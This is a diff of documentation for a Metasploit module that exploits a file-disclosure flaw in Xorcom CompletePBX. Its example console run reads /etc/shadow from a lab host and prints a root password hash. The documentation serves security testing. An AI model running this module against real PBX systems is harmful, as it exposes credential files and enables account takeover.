@@ -37,9 +37,17 @@ run
 
 ## Options
 
-- `USERNAME`: Admin username for authentication.
-- `PASSWORD`: Admin password for authentication.
-- `TARGETFILE`: Path of the file to retrieve (Base64-encoded in request).
+### USERNAME
+
+Admin username for authentication.
+
+### PASSWORD`
+
+Admin password for authentication.
+
+### TARGETFILE
+
+Path of the file to retrieve (Base64-encoded in request).
 
 ## Scenarios
 
@@ -53,10 +61,10 @@ run
 **Steps**:
 
 ```bash
-msf6 auxiliary(admin/http/xorcom_completepbx_file_disclosure) > run http://192.168.56.101/ 
-[*] Running module against 192.168.56.101
-[*] Attempting authentication with username: admin
-[+] Authentication successful! Session ID: sid=535c401396c04a4c92266c2d1457200e6f7c391a
+msf6 auxiliary(scanner/http/xorcom_completepbx_file_disclosure) > run http://192.168.1.32/
+[*] Running module against 192.168.1.32
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
 [*] Attempting to read file: /etc/shadow (Encoded as: ,L2V0Yy9zaGFkb3c=)
 [+] Content of /etc/shadow:
 root:$y$j9T$/vXScZij/ykAtLtP9H1nQ/$KK43hfpOrxdZwAZljjvS5dnF0ipg8NqpCOj9gbLJ9OA:19829:0:99999:7:::
@@ -92,11 +100,6 @@ dnsmasq:!:19829::::::
 polkitd:!*:19829::::::
 asterisk:!:19829::::::
 cc-cloud-rec:!:19829::::::
-<br />                                                                                    <b>Fatal error</b>:  Uncaught TypeError: proc_close(): supplied resource is not a valid process resource in /usr/share/ombutel/www/includes/helper.php:61
-Stack trace:
-#0 /usr/share/ombutel/www/includes/helper.php(61): proc_close()
-#1 [internal function]: ombutel\helper::ombutel\{closure}()                               #2 {main}                                                                                   thrown in <b>/usr/share/ombutel/www/includes/helper.php</b> on line <b>61</b><br />
-
 [*] Auxiliary module execution completed
 ```
 
